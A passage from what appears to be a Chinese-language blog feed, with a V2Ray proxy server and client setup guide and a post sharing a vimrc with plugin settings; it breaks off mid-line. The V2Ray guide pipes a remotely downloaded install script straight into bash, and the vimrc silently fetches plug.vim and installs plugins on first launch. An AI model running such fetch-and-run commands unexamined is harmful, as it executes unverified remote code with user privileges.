    <url>/posts/a98f33e0/</url>
    <content><![CDATA[<h1 id="服务端"><a href="#服务端" class="headerlink" title="服务端"></a>服务端</h1><h2 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h2><p><strong>在Linux上安装需要先安装curl、zip、unzip，运行脚本需要用到</strong><br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">bash &lt;(curl -L -s https://install.direct/go.sh)</span><br><span class="line"></span><br><span class="line"><span class="comment"># archlinux可直接安装</span></span><br><span class="line">sudo pacman -S v2ray</span><br><span class="line"></span><br><span class="line">&lt;!--more--&gt;</span><br></pre></td></tr></table></figure><br><strong>go.sh脚本会自动安装以下文件</strong>：</p>
<ul>
<li><code>/usr/bin/v2ray/v2ray</code>：V2Ray 程序；</li>
<li><code>/usr/bin/v2ray/v2ctl</code>：V2Ray 工具；</li>
<li><code>/etc/v2ray/config.json</code>：配置文件；</li>
<li><code>/usr/bin/v2ray/geoip.dat</code>：IP 数据文件</li>
<li><code>/usr/bin/v2ray/geosite.dat</code>：域名数据文件</li>
</ul>
<p>该脚本会配置自动运行脚本（开机自启），目前自动运行脚本只支持带有 Systemd 的系统，以及 Debian / Ubuntu 全系列</p>
<p>运行脚本位于系统的以下位置：</p>
<ul>
<li><code>/etc/systemd/system/v2ray.service</code>: <strong>Systemd管理</strong></li>
<li><code>/etc/init.d/v2ray</code>: <strong>SysV管理</strong></li>
</ul>
<h3 id="go-sh-参数"><a href="#go-sh-参数" class="headerlink" title="go.sh 参数"></a>go.sh 参数</h3><p>go.sh 支持如下参数，可在手动安装时根据实际情况调整：</p>
<ul>
<li><code>-p</code> 或 <code>--proxy</code>: 使用代理服务器来下载 V2Ray 的文件，格式与 curl 接受的参数一致，比如 <code>&quot;socks5://127.0.0.1:1080&quot;</code> 或 <code>&quot;http://127.0.0.1:3128&quot;</code>。</li>
<li><code>-f</code> 或 <code>--force</code>: 强制安装。在默认情况下，如果当前系统中已有最新版本的 V2Ray，go.sh 会在检测之后就退出。如果需要强制重装一遍，则需要指定该参数。</li>
<li><code>--version</code>: 指定需要安装的版本，比如 “v1.13”。不指定则默认安装最新版本。</li>
<li><code>--local</code>: 使用一个本地文件进行安装。如果你已经下载了某个版本的 V2Ray，则可通过这个参数指定一个文件路径来进行安装。</li>
</ul>
<p>示例：</p>
<ul>
<li>使用地址为 <code>127.0.0.1:1080</code> 的 SOCKS 代理下载并安装最新版本：<code>./go.sh -p socks5://127.0.0.1:1080</code></li>
<li>安装本地的 v1.13 版本：<code>./go.sh --version v1.13 --local /path/to/v2ray.zip</code></li>
</ul>
<h2 id="配置"><a href="#配置" class="headerlink" title="配置"></a>配置</h2><h3 id="配置代理"><a href="#配置代理" class="headerlink" title="配置代理"></a>配置代理</h3><p>编辑 <code>/etc/v2ray/config.json</code> 文件来配置你需要的代理方式<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;inbounds&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;port&quot;</span>: 16823, // 服务器监听端口</span><br><span class="line">      <span class="string">&quot;protocol&quot;</span>: <span class="string">&quot;vmess&quot;</span>,    // 主传入协议</span><br><span class="line">      <span class="string">&quot;settings&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;clients&quot;</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="string">&quot;id&quot;</span>: <span class="string">&quot;b831381d-6324-4d53-ad4f-8cda48b30811&quot;</span>,  // 用户 ID，客户端与服务器必须相同</span><br><span class="line">            <span class="string">&quot;alterId&quot;</span>: 64</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;outbounds&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;protocol&quot;</span>: <span class="string">&quot;freedom&quot;</span>,  // 主传出协议</span><br><span class="line">      <span class="string">&quot;settings&quot;</span>: &#123;&#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><a href="https://www.v2fly.org/chapter_02/01_overview.html">详细配置说明</a></p>
<h3 id="防火墙开放端口"><a href="#防火墙开放端口" class="headerlink" title="防火墙开放端口"></a>防火墙开放端口</h3><p><strong>iptables</strong>:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看已开放端口</span></span><br><span class="line">/etc/init.d/iptables status</span><br><span class="line"></span><br><span class="line"><span class="comment">#开放8080端口</span></span><br><span class="line">iptables -A INPUT -p tcp --dport 8080 -j ACCEPT</span><br><span class="line"></span><br><span class="line"><span class="comment">#保存并重启防火墙</span></span><br><span class="line">/etc/rc.d/init.d/iptables save</span><br><span class="line">/etc/init.d/iptables restart</span><br></pre></td></tr></table></figure><br><strong>frewalld</strong>:<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment">#查看已开放端口</span></span><br><span class="line">firewall-cmd --zone=public --list-ports</span><br><span class="line"></span><br><span class="line"><span class="comment">#开放8080端口</span></span><br><span class="line">firewall-cmd --zone=public --add-port=8080/tcp --permanent</span><br><span class="line"></span><br><span class="line"><span class="comment">#更新规则</span></span><br><span class="line">firewall-cmd --reload 		<span class="comment">#无需断开连接，firealld特性之一动态添加规则</span></span><br><span class="line"></span><br><span class="line">firewall-cmd --complete-reload    <span class="comment">#断开连接，类似于重启服务</span></span><br></pre></td></tr></table></figure></p>
<h3 id="程序管理"><a href="#程序管理" class="headerlink" title="程序管理"></a>程序管理</h3><p>运行 <code>service v2ray start</code> 或<code>systemctl start v2ray</code>来启动 V2Ray 进程<br>之后可以使用 <code>start</code>|<code>stop</code>|<code>status</code>|<code>reload</code>|<code>restart</code>|<code>force-reload</code> 控制 V2Ray 的运行</p>
<h2 id="一键安装脚本-小白玩的"><a href="#一键安装脚本-小白玩的" class="headerlink" title="一键安装脚本(小白玩的)"></a>一键安装脚本(小白玩的)</h2><p><a href="https://github.com/233boy/v2ray/wiki/V2Ray一键安装脚本">V2Ray一键安装脚本（含教程）</a></p>
<h1 id="客户端"><a href="#客户端" class="headerlink" title="客户端"></a>客户端</h1><h2 id="Windows和Mac-OS"><a href="#Windows和Mac-OS" class="headerlink" title="Windows和Mac OS"></a>Windows和Mac OS</h2><p>根据需求<a href="https://github.com/v2ray/v2ray-core/releases">到V2Ray的仓管下载发布的最新版</a><br>下载解压之后可看到 v2ray 或 v2ray.exe 直接运行即可</p>
<h2 id="Linux"><a href="#Linux" class="headerlink" title="Linux"></a>Linux</h2><h4 id="图形客户端"><a href="#图形客户端" class="headerlink" title="图形客户端"></a>图形客户端</h4><p>下载图形化客户端<a href="https://github.com/lhy0403/Qv2ray/releases">Qv2ray</a>,archlinux可通过AUR直接安装<br>解压后双运行，这是会提示没有内核并自动打开存放内核的目录，到<a href="https://github.com/v2ray/v2ray-core/releases">V2Ray的仓库</a>下载Linux版的内核，讲内核解压放到自动打开的目录即可</p>
<p>Qv2ray 在不同系统中查找 v2ray 内核的文件路径 （即找不到内核时自动弹出的文件夹路径）</p>
<ul>
<li>Windows: C:\Users\用户名.qv2ray\vcore</li>
<li>macOS: /Users/用户名/.qv2ray/vcore</li>
<li>Linux: ~/.qv2ray/vcore</li>
</ul>
<h4 id="非图形客户端"><a href="#非图形客户端" class="headerlink" title="非图形客户端"></a>非图形客户端</h4><p>直接和安装服务器版的一样，安装即可<br><strong>配置</strong>：<br><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&#123;</span><br><span class="line">  <span class="string">&quot;inbounds&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;port&quot;</span>: 1080, // 监听端口</span><br><span class="line">      <span class="string">&quot;protocol&quot;</span>: <span class="string">&quot;socks&quot;</span>, // 入口协议为 SOCKS 5</span><br><span class="line">      <span class="string">&quot;sniffing&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;enabled&quot;</span>: <span class="literal">true</span>,</span><br><span class="line">        <span class="string">&quot;destOverride&quot;</span>: [<span class="string">&quot;http&quot;</span>, <span class="string">&quot;tls&quot;</span>]</span><br><span class="line">      &#125;,</span><br><span class="line">      <span class="string">&quot;settings&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;auth&quot;</span>: <span class="string">&quot;noauth&quot;</span>  //socks的认证设置，noauth 代表不认证，由于 socks 通常在客户端使用，所以这里不认证</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ],</span><br><span class="line">  <span class="string">&quot;outbounds&quot;</span>: [</span><br><span class="line">    &#123;</span><br><span class="line">      <span class="string">&quot;protocol&quot;</span>: <span class="string">&quot;vmess&quot;</span>, // 出口协议</span><br><span class="line">      <span class="string">&quot;settings&quot;</span>: &#123;</span><br><span class="line">        <span class="string">&quot;vnext&quot;</span>: [</span><br><span class="line">          &#123;</span><br><span class="line">            <span class="string">&quot;address&quot;</span>: <span class="string">&quot;serveraddr.com&quot;</span>, // 服务器地址，请修改为你自己的服务器 IP 或域名</span><br><span class="line">            <span class="string">&quot;port&quot;</span>: 16823,  // 服务器端口</span><br><span class="line">            <span class="string">&quot;users&quot;</span>: [</span><br><span class="line">              &#123;</span><br><span class="line">                <span class="string">&quot;id&quot;</span>: <span class="string">&quot;b831381d-6324-4d53-ad4f-8cda48b30811&quot;</span>,  // 用户 ID，必须与服务器端配置相同</span><br><span class="line">                <span class="string">&quot;alterId&quot;</span>: 64 // 此处的值也应当与服务器相同</span><br><span class="line">              &#125;</span><br><span class="line">            ]</span><br><span class="line">          &#125;</span><br><span class="line">        ]</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  ]</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><br><a href="https://www.v2fly.org/chapter_02/01_overview.html">详细配置说明</a></p>
<p><a href="https://github.com/v2ray/v2ray-core">【V2Ray仓库】</a><br><a href="https://www.v2ray.com/">【V2Ray官网】（墙外）</a><br><a href="https://www.v2fly.com">【V2Ray用户手册】</a><a href="https://www.v2ray.com">【墙外】</a><br><a href="https://guide.v2fly.org">【V2Ray白话文指南】（社区版）</a><a href="https://toutyrater.github.io/">【官方版】</a></p>
]]></content>
      <tags>
        <tag>v2ray</tag>
      </tags>
  </entry>
  <entry>
    <title>vim插件</title>
    <url>/posts/2f4fd701/</url>
    <content><![CDATA[<h1 id="Vim插件"><a href="#Vim插件" class="headerlink" title="Vim插件"></a>Vim插件</h1><h3 id="安装插件管理器"><a href="#安装插件管理器" class="headerlink" title="安装插件管理器"></a>安装插件管理器</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">curl -fLo ~/.vim/<span class="built_in">autoload</span>/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim	<span class="comment">#安装plugvim ~/.vim/vimrc	#在vimrc文件中启用plug插件管理，并添加配置插件</span></span><br></pre></td></tr></table></figure>
<h3 id="插件安装"><a href="#插件安装" class="headerlink" title="插件安装"></a>插件安装</h3><a id="more"></a>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot;                               _ ____   __     _____ __  __ ____   ____</span></span><br><span class="line"><span class="comment">&quot;   ___  ___  _ __  _   _ _ __ ( ) ___|  \ \   / /_ _|  \/  |  _ \ / ___|</span></span><br><span class="line"><span class="comment">&quot;  / _ \/ _ \| &#x27;_ \| | | | &#x27;_ \|/\___ \   \ \ / / | || |\/| | |_) | |</span></span><br><span class="line"><span class="comment">&quot; |  __/ (_) | | | | |_| | | | |  ___) |   \ V /  | || |  | |  _ &lt;| |___</span></span><br><span class="line"><span class="comment">&quot;  \___|\___/|_| |_|\__,_|_| |_| |____/     \_/  |___|_|  |_|_| \_\\____|</span></span><br><span class="line"><span class="comment">&quot; ===============================木He寸&amp;eonun===============================</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===================</span></span><br><span class="line"><span class="comment">&quot;===首次使用自动配置===</span></span><br><span class="line"><span class="comment">&quot;===================</span></span><br><span class="line"><span class="keyword">if</span> <span class="built_in">empty</span>(<span class="built_in">glob</span>(<span class="string">&#x27;~/.vim/autoload/plug.vim&#x27;</span>))</span><br><span class="line">  <span class="keyword">silent</span> !curl -fLo ~/.<span class="keyword">vim</span>/autoload/plug.<span class="keyword">vim</span> --create-dirs</span><br><span class="line">    \ http<span class="variable">s:</span>//raw.githubusercontent.<span class="keyword">com</span>/junegunn/<span class="keyword">vim</span>-plug/master/plug.<span class="keyword">vim</span></span><br><span class="line">  <span class="keyword">autocmd</span> VimEnter * PlugInstall --<span class="keyword">sync</span> | <span class="keyword">source</span> $MYVIMRC</span><br><span class="line"><span class="keyword">endif</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;=============</span></span><br><span class="line"><span class="comment">&quot;===插件安装===</span></span><br><span class="line"><span class="comment">&quot;====START====</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot; 安装plug：</span></span><br><span class="line"><span class="comment">&quot; curl -fLo ~/.vim/autoload/plug.vim --create-dirs https://raw.githubusercontent.com/junegunn/vim-plug/master/plug.vim</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">call</span> plug#begin(<span class="string">&#x27;~/.vim/plugged&#x27;</span>)  <span class="comment">&quot; 启用plug安装</span></span><br><span class="line"><span class="comment">&quot; 插件github项目地址为：https://github.com/ 加 &#x27;&#x27; 中的内容</span></span><br><span class="line"><span class="comment">&quot; 如：https://github.com/vim-airline/vim-airline</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===状态栏===</span></span><br><span class="line">Plug <span class="string">&#x27;vim-airline/vim-airline&#x27;</span>	<span class="comment">&quot; 状态栏</span></span><br><span class="line">Plug <span class="string">&#x27;vim-airline/vim-airline-themes&#x27;</span>	<span class="comment">&quot; 状态栏主题</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===配色方案===</span></span><br><span class="line">Plug <span class="string">&#x27;lifepillar/vim-solarized8&#x27;</span>		<span class="comment">&quot; solarized8主题</span></span><br><span class="line">Plug <span class="string">&#x27;ayu-theme/ayu-vim&#x27;</span>				<span class="comment">&quot; ayu主题</span></span><br><span class="line">Plug <span class="string">&#x27;nathanaelkane/vim-indent-guides&#x27;</span>	<span class="comment">&quot; 显示缩进级别</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===目录树===</span></span><br><span class="line">Plug <span class="string">&#x27;scrooloose/nerdtree&#x27;</span>				<span class="comment">&quot; 目录树，方便浏览当前目录下的文件</span></span><br><span class="line">Plug <span class="string">&#x27;Xuyuanp/nerdtree-git-plugin&#x27;</span>      <span class="comment">&quot; 目录树git提示</span></span><br><span class="line">Plug <span class="string">&#x27;kien/ctrlp.vim&#x27;</span>					<span class="comment">&quot; 适用于大规模项目文件的浏览</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===自动化===</span></span><br><span class="line">Plug <span class="string">&#x27;neoclide/coc.nvim&#x27;</span>, &#123;<span class="string">&#x27;branch&#x27;</span>: <span class="string">&#x27;release&#x27;</span>&#125;		<span class="comment">&quot; 代码补全 需要vim &gt;=8 或neovim</span></span><br><span class="line">Plug <span class="string">&#x27;vim-syntastic/syntastic&#x27;</span>							<span class="comment">&quot; 错误语法提示</span></span><br><span class="line">Plug <span class="string">&#x27;jiangmiao/auto-pairs&#x27;</span>			<span class="comment">&quot; 符号补全</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===历史===</span></span><br><span class="line">Plug <span class="string">&#x27;mbbill/undotree&#x27;</span>					<span class="comment">&quot; 历史修改撤回</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===文本===</span></span><br><span class="line">Plug <span class="string">&#x27;godlygeek/tabular&#x27;</span>				<span class="comment">&quot; 文本过滤、对齐工具</span></span><br><span class="line">Plug <span class="string">&#x27;gcmt/wildfire.vim&#x27;</span>				<span class="comment">&quot; 视图模式下快速选中符号中的内容</span></span><br><span class="line">Plug <span class="string">&#x27;scrooloose/nerdcommenter&#x27;</span>			<span class="comment">&quot; 快速注释一行</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===markdon===</span></span><br><span class="line">Plug <span class="string">&#x27;iamcco/markdown-preview.nvim&#x27;</span>, &#123; <span class="string">&#x27;do&#x27;</span>: &#123; -&gt; mkdp#util#install() &#125; &#125; <span class="comment">&quot; markdowm预览</span></span><br><span class="line">Plug <span class="string">&#x27;dhruvasagar/vim-table-mode&#x27;</span>, &#123; <span class="string">&#x27;on&#x27;</span>: <span class="string">&#x27;TableModeToggle&#x27;</span> &#125;	<span class="comment">&quot; 表格制作工具</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===其他===</span></span><br><span class="line">Plug <span class="string">&#x27;yianwillis/vimcdoc&#x27;</span>				<span class="comment">&quot; vim中文帮助</span></span><br><span class="line"><span class="string">&quot;Plug &#x27;liuchengxu/vim-which-key&#x27;			&quot;</span> 显示被绑定的可用按键</span><br><span class="line"><span class="comment">&quot;==依赖==</span></span><br><span class="line">Plug <span class="string">&#x27;MarcWeber/vim-addon-mw-utils&#x27;</span></span><br><span class="line">Plug <span class="string">&#x27;kana/vim-textobj-user&#x27;</span></span><br><span class="line">Plug <span class="string">&#x27;fadein/vim-FIGlet&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">call</span> plug#end()		<span class="comment">&quot;结束plug安装</span></span><br><span class="line"><span class="comment">&quot; 刷新vimrc后使用 :PlugInstall 安装插件</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;=====END=====</span></span><br><span class="line"><span class="comment">&quot;===插件安装===</span></span><br><span class="line"><span class="comment">&quot;=============</span></span><br></pre></td></tr></table></figure>
<figure class="highlight vim"><table><tr><td class="code"><pre><span class="line"><span class="comment">&quot;=============</span></span><br><span class="line"><span class="comment">&quot;===插件配置===</span></span><br><span class="line"><span class="comment">&quot;====START====</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;pyhon解释器位置</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:python_host_prog</span>=<span class="string">&#x27;/usr/bin/python2&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:python3_host_prog</span>=<span class="string">&#x27;/usr/bin/python3&#x27;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===状态栏===</span></span><br><span class="line"><span class="comment">&quot;==airline状态栏==</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline</span>#extensions#tabline#enabled = <span class="number">1</span>	<span class="comment">&quot; airline 显示选项卡和缓冲区</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_theme</span>=<span class="string">&#x27;jellybeans&#x27;</span></span><br><span class="line"><span class="comment">&quot; 状态栏分隔美化  需要安装powerline-fonts字体（https://github.com/powerline/fonts） #sudo pacman -S powerline-fonts</span></span><br><span class="line"><span class="keyword">if</span> !exists(<span class="string">&#x27;g:airline_symbols&#x27;</span>)</span><br><span class="line">    <span class="keyword">let</span> <span class="variable">g:airline_symbols</span> = &#123;&#125;</span><br><span class="line">  <span class="keyword">endif</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_left_sep</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_left_alt_sep</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_right_sep</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_right_alt_sep</span> = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_symbols</span>.branch = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_symbols</span>.readonly = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_symbols</span>.linenr = <span class="string">&#x27;☰&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_symbols</span>.maxlinenr = <span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_symbols</span>.dirty= <span class="string">&#x27;⚡&#x27;</span></span><br><span class="line"><span class="comment">&quot;==状态模式简洁显示==</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:airline_mode_map</span> = &#123;</span><br><span class="line">      \ <span class="string">&#x27;__&#x27;</span>     : <span class="string">&#x27;-&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;c&#x27;</span>      : <span class="string">&#x27;C&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;i&#x27;</span>      : <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;ic&#x27;</span>     : <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;ix&#x27;</span>     : <span class="string">&#x27;I&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;n&#x27;</span>      : <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;multi&#x27;</span>  : <span class="string">&#x27;M&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;ni&#x27;</span>     : <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;no&#x27;</span>     : <span class="string">&#x27;N&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;R&#x27;</span>      : <span class="string">&#x27;R&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;Rv&#x27;</span>     : <span class="string">&#x27;R&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;s&#x27;</span>      : <span class="string">&#x27;S&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;S&#x27;</span>      : <span class="string">&#x27;S&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;&#x27;</span>     : <span class="string">&#x27;S&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;t&#x27;</span>      : <span class="string">&#x27;T&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;v&#x27;</span>      : <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;V&#x27;</span>      : <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">      \ <span class="string">&#x27;&#x27;</span>     : <span class="string">&#x27;V&#x27;</span>,</span><br><span class="line">      \ &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===配色方案===</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span>c1 :<span class="keyword">set</span> background=dark<span class="symbol">&lt;CR&gt;</span>:<span class="keyword">colorscheme</span> solarized8<span class="symbol">&lt;CR&gt;</span>:AirlineTheme jellybeans<span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot;配色1</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;LEADER&gt;</span>c2 :<span class="keyword">set</span> background=light<span class="symbol">&lt;CR&gt;</span>:<span class="keyword">let</span> ayucolor=<span class="string">&#x27;light&#x27;</span><span class="symbol">&lt;CR&gt;</span>:<span class="keyword">colorscheme</span> ayu<span class="symbol">&lt;CR&gt;</span>:AirlineTheme ayu_light<span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 配色2</span></span><br><span class="line"><span class="keyword">set</span> termguicolors	<span class="comment">&quot;开启真彩支持</span></span><br><span class="line"><span class="keyword">set</span> background=dark</span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:solarized_termtrans</span>=<span class="number">1</span>	<span class="comment">&quot; 透明背景</span></span><br><span class="line"><span class="keyword">colorscheme</span> solarized8</span><br><span class="line"><span class="string">&quot;let ayucolor=&#x27;light&#x27;	&quot;</span> light mirage dark</span><br><span class="line"><span class="comment">&quot;colorscheme ayu</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;===目录树===</span></span><br><span class="line"><span class="comment">&quot;==NERDTreeToggle==</span></span><br><span class="line"><span class="keyword">nmap</span> <span class="symbol">&lt;F3&gt;</span> :NERDTreeToggle<span class="symbol">&lt;CR&gt;</span>	<span class="comment">&quot; 设置目录树快捷键</span></span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;==NERDTree-git提示==</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:NERDTreeIndicatorMapCustom</span> = &#123;</span><br><span class="line">    \ <span class="string">&quot;Modified&quot;</span>  : <span class="string">&quot;✹&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Staged&quot;</span>    : <span class="string">&quot;✚&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Untracked&quot;</span> : <span class="string">&quot;✭&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Renamed&quot;</span>   : <span class="string">&quot;➜&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Unmerged&quot;</span>  : <span class="string">&quot;═&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Deleted&quot;</span>   : <span class="string">&quot;✖&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Dirty&quot;</span>     : <span class="string">&quot;✗&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Clean&quot;</span>     : <span class="string">&quot;✔︎&quot;</span>,</span><br><span class="line">    \ <span class="string">&quot;Unknown&quot;</span>   : <span class="string">&quot;?&quot;</span></span><br><span class="line">    \ &#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">&quot;==大规模项目文件浏览==</span></span><br><span class="line"><span class="keyword">map</span> <span class="symbol">&lt;C-p&gt;</span> :CtrlP<span class="symbol">&lt;CR&gt;</span></span><br><span class="line"><span class="keyword">let</span> <span class="variable">g:ctrlp_prompt_mappings</span> = &#123;</span><br><span class="line">  \ <span class="string">&#x27;PrtSelectMove(&quot;j&quot;)&#x27;</span>:   [<span class="string">&#x27;&lt;c-e&gt;&#x27;</span>, <span class="string">&#x27;&lt;down&gt;&#x27;</span>],</span><br><span class="line">  \ <span class="string">&#x27;PrtSelectMove(&quot;k&quot;)&#x27;</span>:   [<span class="string">&#x27;&lt;c-u&gt;&#x27;</span>, <span class="string">&#x27;&lt;up&gt;&#x27;</span>],</span><br><span class="line">  \ &#125;</span><br><span class="line">  </span><br><span class="line">  </span><br><span class="line"><span class="comment">&quot;===自动化===</span></span><br><span class="line"><span class="comment">&quot;==coc配置==</span></span><br><span class="line"><span class="comment">&quot; 查看：https://github.com/neoclide/coc.nvim 中Extensions的列表 </span></span><br><span class="line"><span class="comment">&quot; 执行命令安装coc对相应语言的补全</span></span><br><span class="line"></span><br><span class="line"><span class="string">&quot; 若表中没有需要的，可参考 &quot;</span>Register custom <span class="keyword">language</span> servers<span class="comment">&quot; 进行配置</span></span><br><span class="line"><span class="comment">&quot; 参考教程：https://www.jianshu.com/p/231bfb066051</span></span><br><span class="line"><span class="keyword">set</span> timeoutlen=<span class="number">500</span> 		<span class="comment">&quot; 设置按键超时为500ms</span></span><br><span class="line"><span class="keyword">set</span> cmdheight=<span class="number">2</span> 		<span class="comment">&quot; 设置命令行行数</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">inoremap</span> <span class="symbol">&lt;C-d&gt;</span> <span class="symbol">&lt;Esc&gt;</span>:<span class="keyword">set</span> cmdheight=<span class="number">2</span><span class="symbol">&lt;CR&gt;</span><span class="keyword">a</span></span><br><span class="line"><span class="keyword">inoremap</span> <span class="symbol">&lt;C-t&gt;</span> <span class="symbol">&lt;Esc&gt;</span>:<span class="keyword">set</span> cmdheight=<span class="number">10</span><span class="symbol">&lt;CR&gt;</span><span class="keyword">a</span></span><br><span class="line"><span class="keyword">nnoremap</span> <span class="symbol">&lt;C-d&gt;</span> :<span class="keyword">set</span> cmdheight=<span class="number">2</span><span class="symbol">&lt;CR&gt;</span></span><br><span class="line"><span class="keyword">nnoremap</span> <span class="symbol">&lt;C-t&gt;</span> :<span class="keyword">set</span> cmdheight=<span class="number">10</span><span class="symbol">&lt;CR&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">set</span> updatetime=<span class="number">1000</span></span><br><span class="line"><span class="keyword">set</span> shortmess+=<span class="keyword">c</span></span><br><span class="line"><span class="keyword">set</span> signcolumn=yes</span><br><span class="line"><span class="keyword">inoremap</span> <span class="symbol">&lt;silent&gt;</span><span class="symbol">&lt;expr&gt;</span> <span class="symbol">&lt;TAB&gt;</span></span><br><span class="line">      \ <span class="built_in">pumvisible</span>() ? <span class="string">&quot;\&lt;C-n&gt;&quot;</span> :</span><br><span class="line">      \ <span class="symbol">&lt;SID&gt;</span>check_back_space() ? <span class="string">&quot;\&lt;TAB&gt;&quot;</span> :</span><br><span class="line">      \ coc#refresh()</span><br><span class="line"><span class="keyword">inoremap</span> <span class="symbol">&lt;expr&gt;</span><span class="symbol">&lt;S-TAB&gt;</span> <span class="built_in">pumvisible</span>() ? <span class="string">&quot;\&lt;C-p&gt;&quot;</span> : <span class="string">&quot;\&lt;C-h&gt;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span>! <span class="title">s</span>:<span class="title">check_back_space</span><span class="params">()</span> <span class="title">abort</span></span></span><br><span class="line">  <span class="keyword">let</span> <span class="keyword">col</span> = <span class="keyword">col</span>(<span class="string">&#x27;.&#x27;</span>) - <span class="number">1</span></span><br><span class="line">  <span class="keyword">return</span> !col || <span class="built_in">getline</span>(<span class="string">&#x27;.&#x27;</span>)[<span class="keyword">col</span> - <span class="number">1</span>]  =~# <span 